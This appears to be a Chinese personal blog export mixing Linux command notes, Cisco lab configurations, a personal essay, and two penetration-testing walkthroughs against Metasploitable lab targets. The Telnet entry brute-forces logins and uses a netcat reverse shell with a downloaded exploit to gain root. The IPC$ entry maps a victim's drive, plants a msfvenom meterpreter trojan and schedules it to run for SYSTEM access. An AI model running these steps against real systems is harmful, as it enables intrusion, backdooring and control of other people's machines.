    <content><![CDATA[<h1 id="Linux文件基础命令"><a href="#Linux文件基础命令" class="headerlink" title="Linux文件基础命令"></a>Linux文件基础命令</h1><p><strong>1. 用户基本操作</strong></p>
<pre><code>whoami 查看当前登录用户
su [用户名] 切换用户
&quot;$&quot;普通用户   &quot;#&quot;管理员
管理员切换普通用户不用密码，普通用户之间需要密码
useradd   (只有root能用)
passwd [用户名] (只有root能用)</code></pre><p><strong>2. shell快捷键</strong></p>
<pre><code>Ctrl + a 调用命令行的开头
Ctrl + e 调用命令行的结尾
Ctrl + u 将光标处到命令行开头的内容清除
Ctrl + k 将光标处到命令行结尾的内容清除
Ctrl + r 在历史记录列表中搜索某一命令
Ctrl + l 清屏
history 显示历史命令
![number] 直接执行曾执行过的命令
pwd -alh 显示所有信息 -d 只看当前目录的信息</code></pre><p><strong>3.Linux中的目录结构ls命令</strong></p>
<pre><code>cd 路径   切换路径
cd - 返回到之前的目录
cd .. 回上一级目录
cd ~ 到用户所在的家目录</code></pre><p><strong>4.Linux目录含义</strong></p>
<pre><code>/boot Linux启动时需要的文件
/dev      设备文件
/etc       配置文件
/home  用户家目录 
/media 媒体文件
/mnt     挂载文件
/opt      第三方软件
/proc    虚拟化文件
/root    管理员的家目录
/run     进程文件
/srv      压缩过的文件
/sys      系统文件
/usr      安装的软件，共享库
/var      可变数据，日志文件
/tmp     临时文件
/usr/bin     普通用户可以使用的命令
/usr/sbin   超级用户可以使用的命令
/usr/lib      32位库文件
/usr/lib64  64位库文件</code></pre><p><strong>5.Linux中文件的操作</strong></p>
<pre><code>touch 创建一个文件
cp 复制文件
mkdir 创建目录    (-p参数递归创建)
mv 移动文件 (也可重命名)
rm 删除文件 ( -rf 强制删除)</code></pre><p><strong>文件查看</strong></p>
<pre><code>nl  显示的时候出现行号
tac  从最后一行开始显示
head 显示文件的前10行 -n设置行数
tail 显示文件结尾10行 -n设置行数
wc 显示文件的行数，数字，字节</code></pre><p><strong>cat 查看文件</strong></p>
<pre><code>-A 整合命令-vET
-b 列出行号(空白行不算)
-E 将结尾的断行符($)显示出来
-n 列出行号(空白行也会表示)
-T 将tab按键显示
-v 列出特殊字符</code></pre><p><strong>nl</strong></p>
<pre><code>-ba 无论是否有空行都列出行号
-bt 不列出空白行号(默认)
-nln 行号在屏幕最左方
-nrn 行号在屏幕最右方，前面不加0
-nrz 行号在屏幕最右方，前面加0
-w 缩进多少位
find 查找
umount 取消挂载
mount 挂载
vim 编辑**查看文件 - more**
more (一页一页的翻动)
空格：向下翻页
回车：向下翻一行
/字符串  搜索
:+ 立刻显示文件名和行数
b 翻到第一页
q 离开</code></pre><p><strong>5.Linux中文件的操作</strong></p>
<pre><code>touch 创建一个文件
cp 复制文件
mkdir 创建目录    (-p参数递归创建)
mv 移动文件 (也可重命名)
rm 删除文件 ( -rf 强制删除)**文件查看**
nl  显示的时候出现行号
tac  从最后一行开始显示
head 显示文件的前10行 -n设置行数
tail 显示文件结尾10行 -n设置行数
wc 显示文件的行数，数字，字节</code></pre><p><strong>cat 查看文件</strong></p>
<pre><code>-A 整合命令-vET
-b 列出行号(空白行不算)
-E 将结尾的断行符($)显示出来
-n 列出行号(空白行也会表示)
-T 将tab按键显示
-v 列出特殊字符</code></pre><p><strong>nl</strong></p>
<pre><code>-ba 无论是否有空行都列出行号
-bt 不列出空白行号(默认)
-nln 行号在屏幕最左方
-nrn 行号在屏幕最右方，前面不加0
-nrz 行号在屏幕最右方，前面加0
-w 缩进多少位
find 查找
umount 取消挂载
mount 挂载
vim 编辑</code></pre><p><strong>查看文件 - more</strong></p>
<pre><code>more (一页一页的翻动)
空格：向下翻页
回车：向下翻一行
/字符串  搜索
:+ 立刻显示文件名和行数
b 翻到第一页
q 离开</code></pre><p><strong>查看文件 - less</strong></p>
<pre><code>less (一页一页的翻动)
空格 向下翻动一页
pagedown 向下翻动一页
pageup 向上翻动一页
n 重复前一个搜索
N 反方向重新前一个搜索
q 退出</code></pre><p><strong>查看文件</strong></p>
<pre><code>head tail 显示文件头或尾几行
-n 指示显示几行，默认是10行
日志文件/var/log/message 我们只需要看尾部最新的几行即可</code></pre><p><strong>wc 显示文件的行数，数字，字节</strong></p>
<pre><code>-c 只显示字节
-w 只显示字数 一个字被定义为空白，空格或换行字符分隔的字符串
-l 只显示行</code></pre><p><strong>vi / vim 编辑器 (vi是Linux内置编辑器，vim是增强版)</strong></p>
<pre><code>i 插入
esc 退出
u 撤销
x 删除


v 选择文本
y 复制
yy 复制当前行
dd 删除光标所在行
p 粘贴


:w 保存
:wq 保存并退出
:q! 强退 （不保存）</code></pre><p><strong>gedit编辑器[文本编辑器] - 需要X-windows的支持</strong></p>
<h2 id="关机"><a href="#关机" class="headerlink" title="关机"></a><strong>关机</strong></h2><h3 id="需要注意的事项"><a href="#需要注意的事项" class="headerlink" title="需要注意的事项"></a>需要注意的事项</h3><ul>
<li>观察系统的使用状态</li>
<li>通知在线使用者关机的时间</li>
<li>正确的关机指令使用</li>
</ul>
<p><strong>关机指令</strong></p>
<ul>
<li><p>数据同步写入磁盘 -sync</p>
</li>
<li><p>常用的关机指令:shutdown</p>
</li>
<li><p>重启，关机：reboot , half , poweroff</p>
</li>
</ul>
<pre><code>    shutdown 

-t 添加倒数关机秒数
    -k 假关机，发出警报信息
  -r 在系统服务都停止后重启
    -h 在系统服务都停止后关机
  -f 关闭并且开机以后强行略过磁盘检查
    -F 重启后强制进行磁盘检查
  -C 取消已经在进行的shutdown指令内容</code></pre>]]></content>
      <categories>
        <category>网络空间安全</category>
      </categories>
      <tags>
        <tag>网络空间安全</tag>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>OSPF动态路由协议</title>
    <url>/2020/06/26/OSPF/</url>
    <content><![CDATA[<h1 id="网络搭建—OSPF动态路由协议"><a href="#网络搭建—OSPF动态路由协议" class="headerlink" title="网络搭建—OSPF动态路由协议"></a>网络搭建—OSPF动态路由协议</h1><blockquote>
<p>实验平台: Cisco Packet Tracer 7.3.0</p>
</blockquote>
<h2 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h2><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200627000547.png" alt></p>
<h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><p>R1</p>
<pre><code>en
config
int f0/0
no shutdown
ip add 192.168.1.1 255.255.255.0
int s0/0/0
no shutdown
ip add 192.168.3.1 255.255.255.0
exit
ip routing
route ospf 1
network 192.168.1.0 0.0.0.255 area 0
network 192.168.3.0 0.0.0.255 area 0</code></pre><p>R2</p>
<pre><code>en
config
int s0/0/0
no shutdown
ip add 192.168.3.2 255.255.255.0
int s0/0/1
no shutdown
ip add 192.168.4.2 255.255.255.0
exit
ip routing
route ospf 1
network 192.168.4.0 0.0.0.255 area 0
network 192.168.3.0 0.0.0.255 area 0</code></pre><p>R3</p>
<pre><code>en
config
int s0/0/0
no shutdown
ip add 192.168.4.1 255.255.255.0
int f0/0
no shutdown
ip add 192.168.2.1 255.255.255.0
exit
ip routing
route ospf 1
network 192.168.2.0 0.0.0.255 area 0
network 192.168.4.0 0.0.0.255 area 0</code></pre><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200627000520.png" alt></p>
]]></content>
      <categories>
        <category>网络搭建</category>
      </categories>
      <tags>
        <tag>收录</tag>
        <tag>网络搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>PAP认证</title>
    <url>/2020/07/15/PAP/</url>
    <content><![CDATA[<h1 id="网络搭建—PAP认证"><a href="#网络搭建—PAP认证" class="headerlink" title="网络搭建—PAP认证"></a>网络搭建—PAP认证</h1><blockquote>
<p>实验平台: Cisco Packet Tracer 7.3.0</p>
</blockquote>
<h2 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h2><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200715210252.png" alt></p>
<h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><p>R1</p>
<pre><code>en
config
username B PAssword 123
int s0/0/0
ip add 10.0.0.1 255.255.255.0
no shutdown
encapsulation ppp
ppp authentication pap
ppp pap sent-username A password 123
exit
aaa new-model 
aaa authentication ppp default local</code></pre><p>R2</p>
<pre><code>en
config
username A PAssword 123
int s0/0/0
ip add 192.168.1.2 255.255.255.0
no shutdown
encapsulation ppp
ppp authentication pap
ppp pap sent-username B password 123
exit
aaa new-model 
aaa authentication ppp default local</code></pre><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200715210325.png" alt></p>
]]></content>
      <categories>
        <category>网络搭建</category>
      </categories>
      <tags>
        <tag>收录</tag>
        <tag>网络搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>RIP动态路由协议</title>
    <url>/2020/06/26/RIP/</url>
    <content><![CDATA[<h1 id="网络搭建—RIP动态路由协议"><a href="#网络搭建—RIP动态路由协议" class="headerlink" title="网络搭建—RIP动态路由协议"></a>网络搭建—RIP动态路由协议</h1><blockquote>
<p>实验平台: Cisco Packet Tracer 7.3.0</p>
</blockquote>
<h2 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h2><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/r2-1.png" alt></p>
<h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><p>R1</p>
<pre><code>en
config
int f0/0
no shutdown
ip add 192.168.1.1 255.255.255.0
int s0/0/0
no shutdown
ip add 192.168.3.1 255.255.255.0
exit
ip routing
route rip
version 2
no auto
network 192.168.1.0
network 192.168.3.0</code></pre><p>R2</p>
<pre><code>en
config
int s0/0/0
no shutdown
ip add 192.168.3.2 255.255.255.0
int s0/0/1
no shutdown
ip add 192.168.4.2 255.255.255.0
exit
ip routing
route rip
version 2
no auto
network 192.168.4.0
network 192.168.3.0</code></pre><p>R3</p>
<pre><code>en
config
int s0/0/0
no shutdown
ip add 192.168.4.1 255.255.255.0
int f0/0
no shutdown
ip add 192.168.2.1 255.255.255.0
exit
ip routing
route rip
version 2
no auto
network 192.168.2.0
network 192.168.4.0</code></pre><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/r2-2.png" alt></p>
]]></content>
      <categories>
        <category>网络搭建</category>
      </categories>
      <tags>
        <tag>收录</tag>
        <tag>网络搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>Telnet登录提权</title>
    <url>/2020/06/25/Telnet-1/</url>
    <content><![CDATA[<h1 id="Telnet登录破解以及提取最高管理员root权限"><a href="#Telnet登录破解以及提取最高管理员root权限" class="headerlink" title="Telnet登录破解以及提取最高管理员root权限"></a>Telnet登录破解以及提取最高管理员root权限</h1><p>Telnet（Internet<a href="https://baike.baidu.com/item/远程登/2991166" target="_blank" rel="noopener">远程登</a>录服务的标准协议）默认开放于<strong>23端口</strong>。</p>
<p>注意：Telnet是<strong>明文传输</strong></p>
<h2 id="Telnet暴力破解"><a href="#Telnet暴力破解" class="headerlink" title="Telnet暴力破解"></a>Telnet暴力破解</h2><ol>
<li><h4 id="探测目标telnet服务是否开放"><a href="#探测目标telnet服务是否开放" class="headerlink" title="探测目标telnet服务是否开放"></a><strong>探测目标telnet服务是否开放</strong></h4></li>
</ol>
<pre><code>nmap -p 23 -sV 192.168.0.103</code></pre><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/u1.png" alt></p>
<p>  可以看到目标23端口处于Open状态，其开放的服务是Telnet服务</p>
<h4 id="使用Metasploitable进行暴力破解"><a href="#使用Metasploitable进行暴力破解" class="headerlink" title="使用Metasploitable进行暴力破解"></a>使用Metasploitable进行暴力破解</h4><p>   在msf中使用<strong>telnet_login模块</strong></p>
<pre><code>msfconsole
&gt;use auxiliary/scanner/telnet/telnet_login
&gt;set Rhost 目标IP
&gt;set username 用户名
&gt;set pass_file 密码字典
&gt;run</code></pre><blockquote>
<p>在msf中，username指定用户名，user_file指定用户名字典，密码同理</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/u2.png" alt></p>
<p>成功破解，密码为msfadmin</p>
<p>这时可在msf中连接对应的telnet</p>
<pre><code>&gt;sessions -l   查看可连接shell
&gt;sessions -i id    连接指定的id</code></pre><p>可以看到成功连接，测试输入ifconfig有回显参数</p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/u3.png" alt></p>
<h2 id="Telnet明文抓包"><a href="#Telnet明文抓包" class="headerlink" title="Telnet明文抓包"></a>Telnet明文抓包</h2><p>Telnet是<strong>明文传输</strong>，因此可以对此进行网络抓包，详细请见前篇《FTP服务漏洞利用》中的抓包流程</p>
<p>这里不再赘述</p>
<h4 id="这个时候有人要问了，登录了接下来干什么？"><a href="#这个时候有人要问了，登录了接下来干什么？" class="headerlink" title="这个时候有人要问了，登录了接下来干什么？"></a><strong>这个时候</strong>有人要问了，登录了接下来干什么？</h4><h3 id="提权啊！！！"><a href="#提权啊！！！" class="headerlink" title="提权啊！！！"></a>提权啊！！！</h3><h2 id="Telnet提取超级管理员（root）权限"><a href="#Telnet提取超级管理员（root）权限" class="headerlink" title="Telnet提取超级管理员（root）权限"></a>Telnet提取超级管理员（root）权限</h2><p>为方式写的过于繁杂看不懂，这里先做一个流程图</p>
<hr>
<ol>
<li>使用已经破解得到的用户名和密码登录telnet服务</li>
<li>msf中使用session -i 进行shell连接</li>
<li>渗透机准备提权文件</li>
<li>在已连接的shell里面   将渗透机的提权文件下载到受害机上</li>
<li>渗透机开启端口监听</li>
<li>在shell中执行，并定义反弹shell执行地址</li>
<li>连接shell，获得root权限</li>
</ol>
<hr>
<ol>
<li><h4 id="使用已经破解得到的用户名和密码登录telnet服务"><a href="#使用已经破解得到的用户名和密码登录telnet服务" class="headerlink" title="使用已经破解得到的用户名和密码登录telnet服务"></a>使用已经破解得到的用户名和密码登录telnet服务</h4></li>
<li><h4 id="msf中使用session-i-进行shell连接"><a href="#msf中使用session-i-进行shell连接" class="headerlink" title="msf中使用session -i 进行shell连接"></a>msf中使用session -i 进行shell连接</h4><p><strong><em>Kali中使用msf中的session连接shell，上述暴力破解已经描述，这里不再重复</em></strong></p>
<blockquote>
<p>为了不混淆Kali与shell内的操作，后续指令会加上前缀以区分</p>
</blockquote>
</li>
<li><h4 id="渗透机准备提权文件"><a href="#渗透机准备提权文件" class="headerlink" title="渗透机准备提权文件"></a><strong>渗透机准备提权文件</strong></h4><pre><code>kali@root &gt; service apache2 start   启动http服务
kali@root &gt; cd /var/www/html/   
kali@root &gt; wget https://www.exploit-db.com/download/8572    下载提权文件</code></pre><p><strong>这里必须下载到var/www/html</strong></p>
<p><strong>因为受害机无法直接下载提权文件，所以需先将其下载到渗透机，并在渗透机开启http服务</strong></p>
<p><strong>然后从shell里把文件从渗透剂下载到受害机上，而默认传输目录就是var/www/html</strong></p>
<p><strong>这段有点长，但是一定要读懂</strong>！</p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/u4.png" alt></p>
<blockquote>
<p>这里把文件名改成test.c  因为原文件没有扩展名</p>
</blockquote>
</li>
<li><h4 id="在已连接的shell里面-将渗透机的提权文件下载到受害机上"><a href="#在已连接的shell里面-将渗透机的提权文件下载到受害机上" class="headerlink" title="在已连接的shell里面   将渗透机的提权文件下载到受害机上"></a>在已连接的shell里面   将渗透机的提权文件下载到受害机上</h4></li>
</ol>
<pre><code>shell@msfadmin &gt; wget &quot;http://Kali的IP/test.c&quot;</code></pre><p>   <img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/u5.png" alt></p>
<ol start="5">
<li><h4 id="渗透机开启端口监听"><a href="#渗透机开启端口监听" class="headerlink" title="渗透机开启端口监听"></a>渗透机开启端口监听</h4><pre><code>kali@root &gt; nc -lvp 6666</code></pre><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/u6.png" alt></p>
<p><strong>这里Kali的端口6666开启持续监听</strong></p>
</li>
<li><h4 id="在shell中执行，并定义反弹shell执行地址"><a href="#在shell中执行，并定义反弹shell执行地址" class="headerlink" title="在shell中执行，并定义反弹shell执行地址"></a>在shell中执行，并定义反弹shell执行地址</h4><pre><code>shell@msfadmin &gt; gcc test.c -o exploit   编译C程序
shell@msfadmin &gt; echo &apos;#!/bin/sh&apos; &gt; /tmp/run  定义执行环境至/run
shell@msfadmin &gt; echo &apos;/bin/netcat -e /bin/sh KaliIP 监听端口&apos;  &gt;&gt; /tmp/run
shell@msfadmin &gt; cat /tmp/run  验证run配置
shell@msfadmin &gt; ps aux | grep udev  查看pid</code></pre><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/u7.png" alt></p>
<p>这里可以看到pid中已经出现了root权限，<strong>并且其id号为2793</strong></p>
<pre><code>shell@msfadmin &gt; ./exploit root的id号-1</code></pre><p>例：pid中root的id号为2793  那么执行提权的id号是 2792 （即2793-1）</p>
</li>
<li><h4 id="连接shell，获得root权限"><a href="#连接shell，获得root权限" class="headerlink" title="连接shell，获得root权限"></a>连接shell，获得root权限</h4><p>提权开始</p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/u8.png" alt></p>
<p>这里返回刚才持续监听的6666端口</p>
<p>发现已经获取到了root权限</p>
<p>端口监听可能有点慢，需要多等待一会</p>
</li>
</ol>
]]></content>
      <categories>
        <category>网络空间安全</category>
      </categories>
      <tags>
        <tag>网络空间安全</tag>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>《如果爱了》</title>
    <url>/2020/06/25/b-1/</url>
    <content><![CDATA[<h1 id="《如果爱了》"><a href="#《如果爱了》" class="headerlink" title="《如果爱了》"></a>《如果爱了》</h1><h5 id="作者：Oscur"><a href="#作者：Oscur" class="headerlink" title="作者：Oscur"></a>作者：Oscur</h5><h2 id="——序章"><a href="#——序章" class="headerlink" title="——序章"></a>——序章</h2><p>​        我考虑了很久，决定创作这篇文章，或许他是日记，仅为留下记忆，或是纪念，或是录堑，亦或是缅怀。</p>
<p>​        故事很长，倾心诉说。</p>
<p>​        之前看到过一个疑问，如果让你重新再来一次，你还会重蹈覆辙吗，或是说，你后悔吗？若让我重新再来，我仍会做相同的选择，且不后悔，但在她身上，我再不想留下任何感情。人生中遇见的每一个人，都是安排好的，他一定有意义，但是这份所谓的意义也可以是“经历”，我不后悔遇见她，我也不后悔和她发生的一切，但我再也不是从前那个我，我把她当教训，亦不是三年前痴痴的卑微，更不是半年前深情的舔狗。室友开玩笑的说我像个“喜剧演员”，我想我更像Joker吧。</p>
<p>​        因为疫情，高二下学期全部被网课代替，我开始讨厌想起她，厌恶脑海中穿插过关于她的点滴，那种感觉很魔幻，像子弹一样击穿我笨拙的壁垒。每当这个时候我总会用力扇自己一耳光，疼痛总会提醒我，质问我到底变了吗，我还是那个我吗？</p>
<p>​        我喜欢薛之谦，并不是他的歌好听，或是人长得帅，薛先生的歌总会对我的生活产生极大的共鸣，他在讲述一个悲伤的故事，悲伤却被治愈着。最无力，无奈的一首：</p>
<p>​        没有《演员》的决裂冷炎</p>
<p>​        没有《绅士》的进退有度</p>
<p>​        没有《方圆几里》的执着</p>
<p>​        没有《其实》的歇斯底里</p>
<p>只有后知后觉的撕心裂肺，连唱腔都隐隐作痛。</p>
<p>“我们的爱情到这刚刚好，再不争也不吵不必再煎熬，你可以不用记得我的好。”</p>
<p>现在却害怕听薛之谦，恰好的三行情书总会无数次挑动我已经麻木的伤口。</p>
<p>​        <strong>等怂恿的烫了手，等看懂的还我自由</strong></p>
<p>​        谣言横行，舆论传讹，当局者迷。</p>
<p>​        在他们眼中，我便是“绿了她”，“为了好玩才谈”，可我是个什么样的人，我想我身边的朋友比我更清楚。元旦时期，她对我不冷不热，爱搭不理，在我对她的闺蜜进行刨问，对她开始“恳求”时，她告诉我，我和我的女部下有不当之交，甚至于“周遭皆明，唯其不知”，“所有人都在瞒着我”，“他们都在劝我分”</p>
<p>​        体测陪跑？我陪的是整个文体部，怎么就是她一个人了？</p>
<p>​        手牵手？无中生有加上以讹传讹？</p>
<p>​        当然，我更不知道女当事人和她为了躲避我QQ关联的消息查看而“创群聊完删”的操作中，到底有什么，我想我最好不想知道。</p>
<p>​        可能我真的将公私分明做出了极致，在红头文件下偏袒她以前的朋友，在开除处分下挽留她现在的闺蜜，在招新面试中挑选她的同学脱颖而出。工作没有特地安排她和我一组，部门之间没有破坏规矩，全会之下没有鼓起官威。正经的工作居然没有掺杂到任何个人感情，我想我很负责，也很可悲，难道不是吗？副主席？</p>
<p>​        <strong>如果无奈了，那就放下手，野草一定会出卖墙头。</strong></p>
<p>​                                                                                                                               ———2020年5月30日 凌晨1:43 著序</p>
]]></content>
      <categories>
        <category>书</category>
      </categories>
      <tags>
        <tag>书</tag>
        <tag>如果爱了</tag>
      </tags>
  </entry>
  <entry>
    <title>DHCP</title>
    <url>/2020/06/25/dhcp/</url>
    <content><![CDATA[<h1 id="网络搭建—DHCP"><a href="#网络搭建—DHCP" class="headerlink" title="网络搭建—DHCP"></a>网络搭建—DHCP</h1><blockquote>
<p>实验平台: Cisco Packet Tracer 7.3.0</p>
</blockquote>
<h4 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h4><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/dhcp.png" alt></p>
<h4 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h4><h5 id="DHCP配置"><a href="#DHCP配置" class="headerlink" title="DHCP配置"></a>DHCP配置</h5><p>sw1</p>
<pre><code>en
config
int f0/1
no sw
ip add 172.16.1.254 255.255.255.0
int f0/23
no sw
ip add 10.1.1.1 255.255.255.0
service dhcp
ip dhcp exc 172.16.1.253 172.16.1.254
ip dhcp exc 172.16.2.253 172.16.2.254
ip dhcp pool net1
network 172.16.1.0 255.255.255.0
default-router 172.16.1.254
dns-server 10.1.2.1
exit
ip dhcp pool net2
network 172.16.2.0 255.255.255.0
default-router 172.16.2.254
dns-server 10.1.2.1
exit
ip route 172.16.2.0 255.255.255.0 10.1.1.2
ip routing</code></pre><h5 id="DHCP中继"><a href="#DHCP中继" class="headerlink" title="DHCP中继"></a>DHCP中继</h5><p>sw2</p>
<pre><code>en
config
int f0/23
no sw
ip add 10.1.1.2 255.255.255.0
int f0/1
no sw
ip add 172.16.2.254 255.255.255.0
exit
service dhcp
int f0/1
ip helper 10.1.1.1
exit
ip routing
ip route 172.16.1.0 255.255.255.0 10.1.1.1</code></pre><h5 id="DHCP监听"><a href="#DHCP监听" class="headerlink" title="DHCP监听"></a>DHCP监听</h5><p>sw3</p>
<pre><code>en
config
ip dhcp snooping
int f0/1
ip dhcp snooping trust</code></pre><p>sw4</p>
<pre><code>en
config
ip dhcp snooping
int f0/1
ip dhcp snooping trust</code></pre>]]></content>
      <categories>
        <category>网络搭建</category>
      </categories>
      <tags>
        <tag>收录</tag>
        <tag>网络搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>ipc$命令管道入侵示例</title>
    <url>/2020/06/26/ipc$/</url>
    <content><![CDATA[<h2 id="IPC-入侵示例"><a href="#IPC-入侵示例" class="headerlink" title="IPC$入侵示例"></a>IPC$入侵示例</h2><blockquote>
<p>IPC$(Internet Process Connection) 是共享 “ 命名管道 “ 的资源，它是为了让<a href="https://baike.baidu.com/item/进程间通信" target="_blank" rel="noopener">进程间通信</a>而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。 IPC$ 是 NT/2000 的一项新功能，它有一个特点，即在同一时间内，两个 IP 之间只允许建立一个连接。 NT/2000 在提供了  ipc$ 功能的同时，在初次<a href="https://baike.baidu.com/item/安装系统" target="_blank" rel="noopener">安装系统</a>时还打开了<a href="https://baike.baidu.com/item/默认共享" target="_blank" rel="noopener">默认共享</a>，即所有的逻辑共享 (c$,d$,e$ …… ) 和系统目录 winnt 或 windows(admin$) 共享。所有的这些，微软的初衷都是为了方便管理员的管理，但在有意无意中，导致了系统安全性的降低。</p>
</blockquote>
<p>入侵条件：<strong>拥有对方机器的用户名和密码</strong></p>
<p>关于破解用户名密码等请参考文章，<strong>这里不再赘述</strong>！</p>
<p>但是因为ipc$的dos命令登录特殊性，<strong>你甚至可以编写批处理进行暴力破解！</strong></p>
<p>渗透机：Kali Linux 2019.3版本   WindowsXP</p>
<p>靶机：metasploitable3-win2k8</p>
<pre><code>net use \\目标ip\ipc$ 用户密码 /user:用户名   建立空连接
net use z: \\目标ip\c$ 用户密码 /user:用户名  将对方的C盘映射到自己的Z盘中
net use \\目标IP\ipc$ /del                  删除一个ipc$连接
net use z: /del                            删除映射的z盘
//这些都是DOS命令</code></pre><p>这里在破解到该用户的登录密码后，开始尝试建立空连接</p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--1.png" alt></p>
<p>成功建立了空连接</p>
<p>这里尝试对对方的磁盘进行映射</p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--2.png" alt></p>
<p>这里看到，对方的C盘已经映射到左下角的Z盘里了</p>
<p>这里可以轻易访问\读写对方的磁盘</p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--3.png" alt></p>
<h4 id="已经建立了空连接，开始上传木马"><a href="#已经建立了空连接，开始上传木马" class="headerlink" title="已经建立了空连接，开始上传木马"></a><strong>已经建立了空连接，开始上传木马</strong></h4><p>这里利用Kali Linux中Metasploitble生成一个木马文件</p>
<pre><code>msfvenom -p windows/meterpreter/reverse_tcp -i 5 -b &apos;0x00&apos; LHOST=渗透机IP    LPORT=渗透机监听端口 -f exe &gt; 木马名.exe   生成木马
use exploit/multi/handler   定义监听攻击模块
set payloads windows/meterpreter/reverset_tcp   设置payload
set lhost IP    设置渗透机ip
set lport 端口    设置渗透机监听端口
exploit   开始监听</code></pre><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--4.png" alt></p>
<blockquote>
<p>如果出现问题请仔细看上图</p>
</blockquote>
<p>完成创建，木马默认生成在Kali的根目录下</p>
<h4 id="开始上传木马"><a href="#开始上传木马" class="headerlink" title="开始上传木马"></a>开始上传木马</h4><pre><code>copy 本地路径 目标粘贴路径   向对方复制文件</code></pre><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--5.png" alt></p>
<p>这里已经成功把生成的木马文件复制到了目标机器上</p>
<pre><code>at \\目标IP 时间(24h制) 路径   添加计划任务
at \\目标IP   查看计划任务表</code></pre><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--6.png" alt></p>
<p>这里向目标机器添加了计划任务，意思就是2分钟后执行C:\system.exe</p>
<p>at \目标ip  可以验证计划任务添加情况</p>
<blockquote>
<p>这里的时间最好不要设置太近，否则系统会认为是明天的这个时间</p>
</blockquote>
<p><strong>2</strong></p>
<p><strong>分</strong></p>
<p><strong>钟</strong></p>
<p><strong>后</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--7.png" alt></p>
<p>这里可以看到，原在Kali内持续监听的msf已经连接上对应的shell了</p>
<p>输入shell进入   这里whoami已经看到  拿到了<strong>最高system权限</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--8.png" alt></p>
<p><strong>当然！建立空连接后上传木马也好，后门开端口也好，方法大同小异</strong></p>
<p><strong>这里拿到最高权限已经可以准备开后门，留隐藏端口了</strong></p>
<p>这里补充一点msf中本木马的一些相关命令，可以用的到</p>
<pre><code>1.基本命令
help                       查看Meterpreter帮助
